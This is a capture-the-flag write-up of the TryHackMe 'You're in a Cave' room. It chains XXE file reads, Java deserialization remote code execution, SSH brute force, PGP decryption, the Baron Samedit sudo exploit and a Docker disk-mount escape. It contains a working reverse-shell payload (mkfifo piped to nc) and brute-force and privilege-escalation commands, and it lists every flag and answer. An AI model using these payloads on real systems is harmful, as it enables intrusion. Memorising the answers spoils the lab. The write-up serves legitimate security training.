# TryHackMe: You're in a Cave — CTF
**Difficulty:** Insane  

---

## Table of Contents
1. Overview
2. Reconnaissance
3. Initial Access — XXE + Java Deserialization RCE
4. Lateral Movement — Cracking the Door
5. Decrypting the Old Man's Message
6. Defeating the Skeleton
7. Privilege Escalation — Baron Samedit (CVE-2021-3156)
8. Container Escape — Docker Disk Mount
9. Flags Summary

---

## 1. Overview

This room presents a Linux target running a custom Java RPG text-adventure game alongside an Apache web server. The challenge chains together XML External Entity (XXE) injection, Java deserialization, password brute-forcing with a regex-generated wordlist, PGP decryption, binary analysis, a well-known sudo vulnerability (CVE-2021-3156), and Docker container escape via raw disk access — all wrapped in an RPG narrative.

**Attack Chain Summary:**
```
Port Scan → XXE File Read → Java Deserialization RCE → SSH (door) → 
PGP Decrypt → Skeleton Binary → SSH (skeleton) → Baron Samedit → 
Docker Disk Mount → Outside Flag
```

---

## 2. Reconnaissance

### Port Scan
```bash
sudo nmap -p- --min-rate=1000 -T4 <TARGET_IP>
sudo nmap -sC -sV -p 80,2222,3333 <TARGET_IP>
```

**Open Ports:**
| Port | Service | Details |
|------|---------|---------|
| 80 | HTTP | Apache 2.4.41 (Ubuntu) |
| 2222 | SSH | OpenSSH 8.2p1 |
| 3333 | Custom TCP | Java RPG text-adventure game |

### Web Enumeration
```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/big.txt
```

**Key findings:**
- `/attack`, `/search`, `/walk`, `/matches`, `/lamp` — all return base64-encoded Java serialized `Action` objects
- `/action.php` — returns 400 to all standard requests; only accepts `Content-Type: application/xml` or `text/xml`
- `adventurer.cave.thm` vhost discovered via Apache config read — contains `adventurer.priv` (PGP private key)

### RPG Game Analysis (Port 3333)
The game accepts one line of input per connection, then closes. Recognized verbs:
- `attack` — "You punch the wall, nothing happens."
- `search` — "You can't see anything, the cave is very dark."
- `walk` — "There's nowhere to go."
- `matches` — Reveals current working directory (`/home/cave/src`) via backtick shell execution
- `lamp` — Lists directory contents of `/home/cave/src`

**Source Code Recovery via XXE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/cave/src/RPG.java">]>
<foo>&xxe;</foo>
```

**RPG.java key logic:**
```java
String s = scanner.nextLine();
URL url = new URL("http://cave.thm/" + s);
URLConnection con = url.openConnection();
String string = IOUtils.toString(in, encoding);
string = string.replace("\n","").replace("\r","").replace(" ","");
Action action = (Action) Serialize.fromString(string);
action.action();
serverPrintOut.println(action.output);
```

The server fetches `http://cave.thm/<input>`, deserializes the response as an `Action` object, and executes its `command` field via `/bin/sh -c "echo \"<command>\""`.

---

## 3. Initial Access — XXE + Java Deserialization RCE

### The Exploit Chain
1. `action.php` accepts XML with `Content-Type: application/xml`
2. It echoes back the parsed XML text content (classic XXE reflector)
3. The RPG server fetches `http://cave.thm/<socket_input>` — so sending `action.php?<xml>` makes the server fetch our XML, get back a serialized `Action` object, deserialize it, and execute its `command` field

### Building the Malicious Object
Compile on target-compatible Java (JDK 8 for compatibility):

```java
// RPG2.java — stripped down to just generate the payload
String str = Serialize.toString( new Action("abc",
    "trying\";(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <VPN_IP> 4444 >/tmp/f)>/dev/null 2>&1 & disown;echo \"")
);
System.out.println("abc : " + str);
```

```bash
javac RPG2.java
java RPG2
# outputs: abc : rO0ABXNy...
```

### Delivering the Payload
```python
import urllib.parse, base64

b64 = "<output from java RPG2>"
xml = f'<?xml version="1.0" encoding="UTF-8"?><foo>{b64}</foo>'
encoded = urllib.parse.quote(xml, safe='')
print('action.php?' + encoded)
```

```bash
# Start listener
nc -lvnp 4444

# Send exploit to port 3333
echo 'action.php?<url_encoded_xml>' | nc -q3 <TARGET_IP> 3333
```

**Result:** Reverse shell as `cave` (uid=1000)

---

## 4. Lateral Movement — Cracking the Door

### Finding the Door Carving
```bash
cat /home/cave/info.txt
```
Output reveals the carving on the door:
```
^ed[h#f]{3}[123]{1,2}xf[!@#*]$
```
This is the answer to **"What was the weird thing carved on the door?"**

### Generating the Wordlist
```python
import itertools

part1_chars = ['h', '#', 'f']
part2_chars = ['1', '2', '3']
part3_chars = ['!', '@', '#', '*']

with open('/tmp/door_wordlist.txt', 'w') as f:
    for p1 in itertools.product(part1_chars, repeat=3):
        for length in [1, 2]:
            for p2 in itertools.product(part2_chars, repeat=length):
                for p3 in part3_chars:
                    pw = 'ed' + ''.join(p1) + ''.join(p2) + 'xf' + p3
                    f.write(pw + '\n')
# 1,296 candidates
```

Verified with `exrex` against the exact regex — lists are identical.

### SSH Brute Force
```bash
hydra -l door -P /tmp/door_wordlist.txt -s 2222 ssh://<TARGET_IP> -t 8 -f
```

**Result:** `door` / `edfh#22xf!`

---

## 5. Decrypting the Old Man's Message

### Finding the PGP Key
```bash
# Add to /etc/hosts
echo "<TARGET_IP> adventurer.cave.thm cave.thm" | sudo tee -a /etc/hosts

# Download the key
curl -s http://adventurer.cave.thm/adventurer.priv -o /tmp/adventurer.priv
```

The private key is for `adventurer <adventurer@cave.com>`, key ID `FFF6C0EECD850FDC`. The encryption subkey `D5A213D292A0A259` matches the key used to encrypt `oldman.gpg`.

### Finding the Passphrase
The passphrase is hidden in `/home/door/info.txt` using an ANSI escape sequence (`^[[A` = cursor up) that makes it invisible during normal display:

```bash
cat -v /home/door/info.txt
# Reveals: "The private key password is breakingbonessince1982 ^[[A"
```

**Passphrase:** `breakingbonessince1982`

### Decrypting oldman.gpg
```bash
ssh -p 2222 door@<TARGET_IP>
curl -s http://adventurer.cave.thm/adventurer.priv | gpg --batch --passphrase "breakingbonessince1982" --pinentry-mode loopback --import
gpg --batch --passphrase "breakingbonessince1982" --pinentry-mode loopback --decrypt /home/door/oldman.gpg
```

**Output:**
```
IT'S DANGEROUS TO GO ALONE! TAKE THIS bone-breaking-war-hammer
```

---

## 6. Defeating the Skeleton

The `skeleton` binary in `/home/door/` reads the `INVENTORY` environment variable (colon-separated item list) and checks for a specific weapon.

```bash
ssh -p 2222 door@<TARGET_IP>
export INVENTORY=lamp:bone-breaking-war-hammer
./skeleton
```

**Output:** `skeleton:sp00kyscaryskeleton`

This is the answer to **"What weapon did you use to defeat the skeleton?"**: `bone-breaking-war-hammer`

---

## 7. Privilege Escalation — Baron Samedit (CVE-2021-3156)

### SSH as skeleton
```bash
ssh -p 2222 skeleton@<TARGET_IP>
# Password: sp00kyscaryskeleton
```

### Identifying the Vulnerability
```bash
sudo --version
# Sudo version 1.8.31 — vulnerable to CVE-2021-3156
```

### Exploiting Baron Samedit
```bash
# On Kali — clone and transfer
git clone https://github.com/blasty/CVE-2021-3156.git
scp -P 2222 -r /tmp/CVE-2021-3156 skeleton@<TARGET_IP>:/tmp/

# On target — compile natively (avoids glibc version mismatch)
cd /tmp/CVE-2021-3156
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

# Run exploit — target 1 = Ubuntu 20.04.1, sudo 1.8.31
python3 /tmp/exploit_nss.py
# OR
./sudo-hax-me-a-sandwich 1
```

**Result:** Root shell inside the Docker container

### Cave Flag
```bash
cat /root/info.txt
# Flag: THM{no_wall_can_stop_me}
```

---

## 8. Container Escape — Docker Disk Mount

### Confirming Docker Environment
```bash
cat /proc/1/cgroup
# Shows: /docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
systemd-detect-virt
# docker
```

### Mounting the Host Disk
The host disk `/dev/xvda2` is visible inside the container. As root, we can mount it:

```bash
mount /dev/xvda2 /mnt
ls /mnt  # Shows full host filesystem
cat /mnt/root/info.txt
```

### Outside Flag
```bash
cat /mnt/root/info.txt
# Flag: THM{digging_down_then_digging_up}
```

---

## 9. Flags Summary

| Question | Answer |
|----------|--------|
| What was the weird thing carved on the door? | `^ed[h#f]{3}[123]{1,2}xf[!@#*]$` |
| What weapon did you use to defeat the skeleton? | `bone-breaking-war-hammer` |
| What is the cave flag? | `THM{no_wall_can_stop_me}` |
| What is the outside flag? | `THM{digging_down_then_digging_up}` |

---

## Key Techniques Used

| Technique | Tool/Method |
|-----------|------------|
| XXE Arbitrary File Read | PHP `file://` and `php://filter` wrappers |
| Java Deserialization RCE | Custom `Action` object serialized and reflected via XXE |
| Regex-based wordlist generation | Python `itertools` / `exrex` |
| SSH brute force | Hydra |
| Steganographic passphrase | ANSI escape sequence `^[[A` hiding text in plain sight |
| PGP decryption | GPG with `--pinentry-mode loopback` |
| Linux privesc | CVE-2021-3156 (Baron Samedit) — Sudo heap overflow |
| Docker container escape | Raw block device (`/dev/xvda2`) mount as root |

---

*Writeup produced as part of TryHackMe "You're in a Cave" (Insane) room completion.*
